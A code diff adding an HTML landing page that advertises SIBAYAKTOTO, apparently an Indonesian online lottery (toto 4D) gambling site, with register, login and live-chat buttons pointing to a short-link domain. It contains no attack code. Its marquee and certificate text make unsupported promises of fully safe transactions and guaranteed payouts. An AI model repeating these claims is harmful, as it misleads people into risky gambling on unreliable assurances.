+        .fi-10 { left: 78vw; width: 25px; height: 25px; animation-duration: 7.0s, 2.3s; animation-delay: 4.8s, 4.8s; }
+        .fi-11 { left: 86vw; width: 32px; height: 32px; animation-duration: 8.8s, 3.2s; animation-delay: 1.7s, 1.7s; }
+        .fi-12 { left: 93vw; width: 26px; height: 26px; animation-duration: 7.8s, 2.7s; animation-delay: 5.9s, 5.9s; }
+        .fi-13 { left: 16vw; width: 28px; height: 28px; animation-duration: 8.2s, 3.0s; animation-delay: 6.5s, 6.5s; }
+        .fi-14 { left: 40vw; width: 24px; height: 24px; animation-duration: 7.4s, 2.5s; animation-delay: 7.1s, 7.1s; }
+        .fi-15 { left: 66vw; width: 30px; height: 30px; animation-duration: 9.0s, 3.3s; animation-delay: 3.9s, 3.9s; }
+        .fi-16 { left: 82vw; width: 22px; height: 22px; animation-duration: 6.9s, 2.1s; animation-delay: 7.8s, 7.8s; }
+    </style>
+</head>
+
+<body>
+
+    <!-- 1. ROYAL VELVET CURTAIN OPENING (Vintage Style) -->
+    <div class="curtain-stage">
+        <!-- Left Velvet Panel -->
+        <div class="curtain-panel curtain-left">
+            <div class="curtain-tassel-strip"></div>
+            <div class="royal-wax-seal">
+                <div class="seal-logo-wrap">
+                    <amp-img src="https://imgnice.com/images/2026/07/17/ci-i-o.png" width="100" height="100"
+                        layout="fixed" alt="Royal Crest"></amp-img>
+                </div>
+            </div>
+        </div>
+
+        <!-- Right Velvet Panel -->
+        <div class="curtain-panel curtain-right">
+            <div class="curtain-tassel-strip"></div>
+            <div class="royal-wax-seal">
+                <div class="seal-logo-wrap">
+                    <amp-img src="https://imgnice.com/images/2026/07/17/ci-i-o.png" width="100" height="100"
+                        layout="fixed" alt="Royal Crest"></amp-img>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 2. VINTAGE PARCHMENT OVERLAY -->
+    <div class="vintage-overlay-bg"></div>
+
+    <!-- 3. MAIN ROYAL APARTMENT CONTENT -->
+    <main class="royal-container">
+        <!-- Header -->
+        <header class="vintage-header">
+            <div class="header-seal-brand">
+                <span class="header-flourish">⚜ EST. 2026 • OFFICIAL ⚜</span>
+                <a href="https://p-balap.info/short-link/masuk-sby/" target="_blank" rel="noopener noreferrer">
+                    <amp-img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgxIOmfG4wtkwqmzWMMYxjrlZe0mCFdyx2UjOKgCOEx3nQ-rsPPSEYvI2xDIindTFf2IL7pGArcI5MV70kHtVeuAFb1GaCOjxuMfZuzXnSwbbp4eKTqpHWST7alWenMkSwBx1wlzYUVdCobhHIrLn3v0_j7PxiagCBX6LFj9U9_QhMPOgmRNJmh9K7xzSgN/s1402/logo-dekstopp.png" width="165" height="48"
+                        layout="intrinsic" alt="Logo SIBAYAKTOTO"></amp-img>
+                </a>
+            </div>
+            <a href="https://p-balap.info/short-link/masuk-sby/" class="btn-livechat-vintage" target="_blank"
+                rel="noopener noreferrer">
+                <span class="ONLINE-dot"></span>
+                ONLINE
+            </a>
+        </header>
+
+        <!-- Antique Royal Proclamation Marquee -->
+        <div class="royal-proclamation">
+            <span class="proclamation-text">
+                ⚜ SITUS TOTO 4D RESMI BERBASIS MOBILE ⚜ &nbsp;•&nbsp; BANDAR TOGEL TERPERCAYA PASARAN TERLENGKAP &nbsp;•&nbsp; DEPOSIT QRIS INSTAN &amp; TRANSAKSI 100% AMAN &nbsp;•&nbsp; HADIAH FULL BET TERBESAR &nbsp;•&nbsp; LAYANAN NONSTOP 24 JAM ⚜
+            </span>
+        </div>
+
+        <!-- Gilded Victorian Hero Frame -->
+        <section class="vintage-hero-frame">
+            <div class="vintage-hero-inner">
+                <amp-img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg1W8WZ6M3ZtC2qQ56TVHMElFg4cUGnV6YVp5Xx31ApHB5ziTGIvUDDsBv4nMNVbGJBi-sHZcd2wufBQ7xJ5rTkoTzT157XnlxShIR0v_MLf5nMnAy5Ag-Sj3yqov789qBwzKbyw_w4RleD73tSKkfqQD1zgZDcEVv3t0JkYqAlLShL8P8EhzTaj_asRgw/s800/situstoto4dresmi.jpg" width="480" height="480"
+                    layout="responsive" alt="SIBAYAKTOTO Royal Suite 4D"></amp-img>
+            </div>
+        </section>
+
+        <!-- Filigree Divider -->
+        <div class="filigree-divider">⚜ ❖ ⚜</div>
+
+        <!-- Royal Action Badges -->
+        <div class="vintage-action-grid">
+            <a href="https://p-balap.info/short-link/masuk-sby/" class="btn-vintage btn-vintage-daftar" target="_blank"
+                rel="noopener noreferrer">
+                <span class="action-title">DAFTAR AKUN</span>
+                <span class="action-sub">✦ REGISTRASI VIP RESMI ✦</span>
+            </a>
+
+            <a href="https://p-balap.info/short-link/masuk-sby/" class="btn-vintage btn-vintage-login" target="_blank"
+                rel="noopener noreferrer">
+                <span class="action-title">MASUK RESMI</span>
+                <span class="action-sub">✦ LOGIN MEMBER RESMI ✦</span>
+            </a>
+
+            <a href="https://direct.lc.chat/18940341" class="btn-vintage btn-vintage-ONLINE" target="_blank"
+                rel="noopener noreferrer">
+                <span class="action-title">⚜ LIVECHAT ONLINE 24/7 ⚜</span>
+            </a>
+        </div>
+
+        <!-- Filigree Divider -->
+        <div class="filigree-divider">⚜ PASARAN UTAMA ⚜</div>
+
+        <!-- Antique Postage / Tarot Pasaran Grid -->
+        <div class="vintage-pasaran-grid">
+            <!-- Macau -->
+            <div class="pasaran-card-vintage" title="Toto Macau">
+                <span class="stamp-corner">I</span>
+                <amp-img src="https://goodimg.io/images/2026/09/06/macauguruicon.png" width="48" height="48"
+                    alt="Toto Macau"></amp-img>
+                <span class="stamp-title">MACAU</span>
+                <span class="stamp-time">6X PUTARAN</span>
+            </div>
+
+            <!-- Singapore -->
+            <div class="pasaran-card-vintage" title="Singapore Pools">
+                <span class="stamp-corner">II</span>
+                <amp-img src="https://goodimg.io/images/2026/09/06/sgpguruicon.png" width="48" height="48"
+                    alt="Singapore Pools"></amp-img>
+                <span class="stamp-title">SGP</span>
+                <span class="stamp-time">17:45 WIB</span>
+            </div>
+
+            <!-- Hongkong -->
+            <div class="pasaran-card-vintage" title="Hongkong Pools">
+                <span class="stamp-corner">III</span>
+                <amp-img src="https://goodimg.io/images/2026/09/06/hkguruicon.png" width="48" height="48"
+                    alt="Hongkong Pools"></amp-img>
+                <span class="stamp-title">HK</span>
+                <span class="stamp-time">23:00 WIB</span>
+            </div>
+
+            <!-- Sydney -->
+            <div class="pasaran-card-vintage" title="Sydney Pools">
+                <span class="stamp-corner">IV</span>
+                <amp-img src="https://goodimg.io/images/2026/09/06/sdyguruicon.png" width="48" height="48"
+                    alt="Sydney Pools"></amp-img>
+                <span class="stamp-title">SDY</span>
+                <span class="stamp-time">14:00 WIB</span>
+            </div>
+        </div>
+
+        <!-- Victorian Proclamation Certificate -->
+        <div class="royal-ledger-box">
+            <div class="ledger-title">⚜ SERTIFIKAT PASARAN TOTO 4D ⚜</div>
+            <p class="ledger-desc">SIBAYAKTOTO menyajikan integritas taruhan toto 4D klasik berdiskon tertinggi, bebas batasan line invest, serta penarikan dana terpercaya dengan jaminan pelunasan penuh.</p>
+        </div>
+
+        <div class="filigree-divider">⚜ ❖ ⚜</div>
+
+        <!-- Footer -->
+        <footer>
+            <p>&copy; 2026 <a href="https://p-balap.info/short-link/masuk-sby/">SIBAYAKTOTO</a>. All Rights Reserved.</p>
+        </footer>
+    </main>
+
+    <!-- 4. ANIMASI PARTIKEL JATUH (FALLING ICONS) -->
+    <div class="falling-icons-wrap" aria-hidden="true">
+        <div class="falling-icon fi-fav fi-1"></div>
+        <div class="falling-icon fi-guru fi-2"></div>
+        <div class="falling-icon fi-fav fi-3"></div>
+        <div class="falling-icon fi-guru fi-4"></div>
+        <div class="falling-icon fi-fav fi-5"></div>
+        <div class="falling-icon fi-guru fi-6"></div>
+        <div class="falling-icon fi-fav fi-7"></div>
+        <div class="falling-icon fi-guru fi-8"></div>
+        <div class="falling-icon fi-fav fi-9"></div>
+        <div class="falling-icon fi-guru fi-10"></div>
+        <div class="falling-icon fi-fav fi-11"></div>
+        <div class="falling-icon fi-guru fi-12"></div>
+        <div class="falling-icon fi-fav fi-13"></div>
+        <div class="falling-icon fi-guru fi-14"></div>
+        <div class="falling-icon fi-fav fi-15"></div>
+        <div class="falling-icon fi-guru fi-16"></div>
+    </div>
+
+</body>
+
+</html>
+
+
+    
